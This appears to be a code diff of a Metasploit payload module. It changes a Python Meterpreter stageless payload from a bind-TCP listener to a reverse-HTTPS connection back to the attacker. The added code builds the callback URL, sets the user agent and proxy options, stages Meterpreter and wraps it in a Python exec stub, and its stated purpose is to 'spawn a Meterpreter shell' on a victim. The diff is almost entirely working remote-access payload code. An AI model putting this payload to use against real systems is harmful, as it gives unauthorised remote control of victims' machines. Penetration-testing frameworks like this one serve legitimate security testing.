@@ -4,42 +4,44 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/bind_tcp'
+require 'msf/core/handler/reverse_https'
 require 'msf/core/payload/python'
 require 'msf/core/payload/python/meterpreter_loader'
-require 'msf/core/payload/python/bind_tcp'
+require 'msf/core/payload/python/reverse_http'
 require 'msf/base/sessions/meterpreter_python'
 
 module Metasploit4
 
-  CachedSize = 50226
+  CachedSize = 50190
 
   include Msf::Payload::Single
   include Msf::Payload::Python
-  include Msf::Payload::Python::BindTcp
+  include Msf::Payload::Python::ReverseHttp
   include Msf::Payload::Python::MeterpreterLoader
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Python Meterpreter Shell, Bind TCP Inline',
-      'Description' => 'Connect to the victim and spawn a Meterpreter shell',
+      'Name'        => 'Python Meterpreter Shell, Reverse HTTPS Inline',
+      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
       'Author'      => 'Spencer McIntyre',
       'License'     => MSF_LICENSE,
       'Platform'    => 'python',
       'Arch'        => ARCH_PYTHON,
-      'Handler'     => Msf::Handler::BindTcp,
+      'Handler'     => Msf::Handler::ReverseHttps,
       'Session'     => Msf::Sessions::Meterpreter_Python_Python
     ))
   end
 
-  def generate_bind_tcp(opts={})
-    socket_setup  = "bind_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-    socket_setup << "bind_sock.bind(('0.0.0.0', #{opts[:port]}))\n"
-    socket_setup << "bind_sock.listen(1)\n"
-    socket_setup << "s, address = bind_sock.accept()\n"
-    opts[:stageless_tcp_socket_setup] = socket_setup
+  def generate_reverse_http(opts={})
+    opts[:scheme] = 'https'
+    opts[:uri_uuid_mode] = :init_connect
+    met = stage_meterpreter({
+      http_url: generate_callback_url(opts),
+      http_user_agent: opts[:user_agent],
+      http_proxy_host: opts[:proxy_host],
+      http_proxy_port: opts[:proxy_port]
+    })
 
-    met = stage_meterpreter(opts)
     py_create_exec_stub(met)
   end
 
